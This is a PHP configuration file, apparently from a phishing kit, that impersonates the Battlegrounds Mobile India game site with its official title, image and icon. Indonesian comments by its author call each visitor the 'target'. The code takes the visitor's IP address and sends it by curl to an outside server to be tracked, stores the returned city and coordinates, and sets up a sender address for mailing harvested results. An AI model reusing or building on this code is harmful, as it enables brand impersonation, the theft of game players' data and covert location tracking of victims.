<?php
// SCRIPT BY ARPANTEK
// COPYRIGHT Â©ï¸ ITS ME ARPANTEK
// HARGAI W OK, JANGAN LO UBAH COPYRIGHT NYA

date_default_timezone_set('Asia/Jakarta');
$jamasuk = date('l, d-m-Y h:i:s');

$title = 'BATTLEGROUNDS MOBILE INDIA';
$description = 'BATTLEGROUNDS MOBILE INDIA';
$copyright = 'PUBG MOBILE INDIA';
$theme = '#000';
$image = 'https://www.battlegroundsmobileindia.com/common/img/thum.jpg';
$icon = 'https://www.battlegroundsmobileindia.com/common/img/favicon.ico';

// KONTROL UNTUK HALAMAN KIRIM RESULT
$author = 'ITS ME ARPANTEK';
$sender = 'From: ARPANTEK <sendgrid.mee@gmail.com>';

// MENDAPATKAN ALAMAT IP PRIBADI SI TARGET
function getClientIP() {
$ipaddress = '';
if (getenv('HTTP_CLIENT_IP'))
$ipaddress = getenv('HTTP_CLIENT_IP');
else if(getenv('HTTP_X_FORWARDED_FOR'))
$ipaddress = getenv('HTTP_X_FORWARDED_FOR');
else if(getenv('HTTP_X_FORWARDED'))
$ipaddress = getenv('HTTP_X_FORWARDED');
else if(getenv('HTTP_FORWARDED_FOR'))
$ipaddress = getenv('HTTP_FORWARDED_FOR');
else if(getenv('HTTP_FORWARDED'))
$ipaddress = getenv('HTTP_FORWARDED');
else if(getenv('REMOTE_ADDR'))
$ipaddress = getenv('REMOTE_ADDR');
else
$ipaddress = 'UNKNOWN';
return $ipaddress;
}

// MENGIRIM ALAMAT IP PRIBADI SI TARGET KE SERVER UNTUK DILACAK
$url = "https://api-xyz.com/system/flag/?ip=".getClientIP();

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$resp = curl_exec($curl);
		curl_close($curl);
$data = json_decode($resp,true);

// HASIL PELACAKAN ALAMAT IP PRIBADI SI TARGET
$arpantek_ip_address = getClientIP();
$arpantek_flag = $data['flag'];
$arpantek_callingcode = $data['code'];
$arpantek_continent = $data['continent'];
$arpantek_country = $data['country'];
$arpantek_region = $data['region'];
$arpantek_city = $data['city'];
$arpantek_latitude = $data['latitude'];
$arpantek_longitude = $data['longitude'];
?>